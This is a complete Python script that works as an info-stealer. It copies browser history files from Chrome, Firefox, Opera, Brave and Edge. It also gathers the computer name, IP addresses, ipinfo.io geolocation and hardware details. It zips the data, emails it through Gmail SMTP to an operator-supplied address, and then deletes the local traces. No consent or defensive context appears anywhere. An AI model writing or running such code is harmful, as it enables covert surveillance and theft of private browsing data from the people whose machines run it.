import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import os
from shutil import copyfile
import zipfile
import socket
import requests
import platform
import subprocess
import json
import psutil
import GPUtil

def send_email(subject, body, attachment_path, to_addr):
    from_addr = '* Your Gmail Email Address Here *'
    app_password = '* Your Gmail App Password Here *'  # Your Gmail App Password AKA An Gmail SMTP API Key

    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    with open(attachment_path, 'rb') as f:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
        msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_addr, app_password)
        server.sendmail(from_addr, to_addr, msg.as_string())
        server.quit()
        print("Email sent successfully!")
        return True
    except Exception as e:
        print(f"Failed to send email: {e}")
        return False

def get_browser_history(browser_name):
    user_profile = os.getenv('USERPROFILE')
    history_paths = {
        'chrome': os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'),
        'firefox': os.path.join(user_profile, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
        'opera': os.path.join(user_profile, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'History'),
        'brave': os.path.join(user_profile, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History'),
        'edge': os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History')
    }

    history_path = history_paths.get(browser_name)
    if not history_path:
        raise Exception(f"No history path found for {browser_name}")

    if browser_name == 'firefox':
        for root, dirs, files in os.walk(history_path):
            for file in files:
                if file.endswith('.sqlite'):
                    history_path = os.path.join(root, file)
                    break

    if os.path.exists(history_path):
        copyfile(history_path, f'{browser_name}_History')
        return f'{browser_name}_History'
    else:
        raise Exception(f"{browser_name} history file not found")

def compress_file(file_path):
    zip_file = file_path + '.zip'
    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(file_path, os.path.basename(file_path))
    return zip_file

def get_ip_addresses():
    ip_addresses = {"IPv4": [], "IPv6": []}
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                ip_addresses["IPv4"].append(addr.address)
            elif addr.family == socket.AF_INET6:
                ip_addresses["IPv6"].append(addr.address)
    return ip_addresses

def get_location():
    try:
        response = requests.get("http://ipinfo.io/json")
        data = response.json()
        return {
            "IP": data.get("ip"),
            "City": data.get("city"),
            "Region": data.get("region"),
            "Country": data.get("country"),
            "Location": data.get("loc"),
            "Organization": data.get("org"),
            "Postal": data.get("postal"),
        }
    except Exception as e:
        return {"Error": str(e)}

def get_gpu_info():
    try:
        gpus = GPUtil.getGPUs()
        gpu_info = []
        for gpu in gpus:
            gpu_info.append({
                "Name": gpu.name,
                "Load": f"{gpu.load * 100}%",
                "Free Memory": f"{gpu.memoryFree}MB",
                "Used Memory": f"{gpu.memoryUsed}MB",
                "Total Memory": f"{gpu.memoryTotal}MB",
                "Temperature": f"{gpu.temperature}°C"
            })
        return gpu_info
    except Exception as e:
        return [{"Error": str(e)}]

def get_cpu_info():
    return {
        "Processor": platform.processor(),
        "Cores (Physical)": psutil.cpu_count(logical=False),
        "Cores (Logical)": psutil.cpu_count(logical=True),
        "Max Frequency": f"{psutil.cpu_freq().max}Mhz",
        "Min Frequency": f"{psutil.cpu_freq().min}Mhz",
        "Current Frequency": f"{psutil.cpu_freq().current}Mhz"
    }

def main():
    system_info = {
        "Computer Name": platform.node(),
        "IP Addresses": get_ip_addresses(),
        "Location": get_location(),
        "GPU Information": get_gpu_info(),
        "CPU Information": get_cpu_info(),
    }

    log_file = "system_info_log.json"
    with open(log_file, "w") as f:
        json.dump(system_info, f, indent=4)

    browsers = ['chrome', 'firefox', 'opera', 'brave', 'edge']
    sent = False

    for browser in browsers:
        try:
            history_file = get_browser_history(browser)
            compressed_history = compress_file(history_file)
            if os.path.getsize(compressed_history) > 20 * 1024 * 1024:
                print(f"Compressed file size is too large: {os.path.getsize(compressed_history)} bytes")
                continue
            
            compressed_log = compress_file(log_file)
            combined_zip = 'combined_data.zip'
            with zipfile.ZipFile(combined_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(compressed_history, os.path.basename(compressed_history))
                zipf.write(compressed_log, os.path.basename(compressed_log))

            if send_email("System and Browser Information", "Attached is the system and browser history data.", combined_zip, '* Your Gmail Email Address Here *'):
                os.remove(history_file)
                os.remove(compressed_history)
                os.remove(compressed_log)
                os.remove(log_file)
                os.remove(combined_zip)
                print(f"Deleted history file: {history_file}, compressed history: {compressed_history}, compressed log: {compressed_log}, log file: {log_file}, and combined zip: {combined_zip}")
                sent = True
                break
        except Exception as e:
            print(f"An error occurred with {browser}: {e}")

    if not sent:
        print("No browsing history could be collected.")

if __name__ == "__main__":
    main()
